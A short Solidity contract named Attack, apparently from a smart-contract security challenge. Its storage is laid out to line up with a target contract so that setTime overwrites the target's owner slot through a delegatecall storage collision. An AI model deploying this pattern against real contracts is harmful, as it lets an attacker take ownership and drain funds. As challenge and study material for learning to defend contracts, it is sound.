// SPDX-License-Identifier: UNLICENSED
pragma solidity "0.8.19";

contract Attack {
    address public dummyAddress; //slot 0
    address public dummyAddress2; //slot 1
    uint256 public matchingOwnerSlot; //slot 2

    function setTime(uint256 _time) public {
        matchingOwnerSlot = _time;
    }
}
